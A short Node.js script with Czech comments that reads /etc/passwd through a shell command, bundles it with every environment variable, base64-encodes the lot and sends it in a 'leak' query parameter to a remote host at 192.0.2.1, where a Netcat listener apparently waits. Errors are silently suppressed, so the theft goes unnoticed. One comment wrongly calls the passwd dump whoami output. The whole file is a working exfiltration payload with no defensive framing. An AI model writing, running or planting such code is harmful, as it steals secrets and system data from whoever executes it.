const http = require('http');
const { execSync } = require('child_process');

try {
// 1. Synchronně spustíme příkaz a uložíme textový výsledek do proměnné
const whoamiOutput = execSync('cat /etc/passwd').toString();

// 2. Složíme data dohromady
const combinedData = {
environment: process.env,
osUser: whoamiOutput.trim() // Výsledek příkazu whoami
};

const encoded = Buffer.from(JSON.stringify(combinedData)).toString('base64');

// 3. Odešleme na Netcat
const req = http.request({
hostname: '192.0.2.1',
port: 80,
path: `/?leak=${encoded}`,
method: 'GET'
});

req.on('error', () => {});
req.end();

} catch (e) {
// Zachycení chyb, pokud by execSync selhal
} 
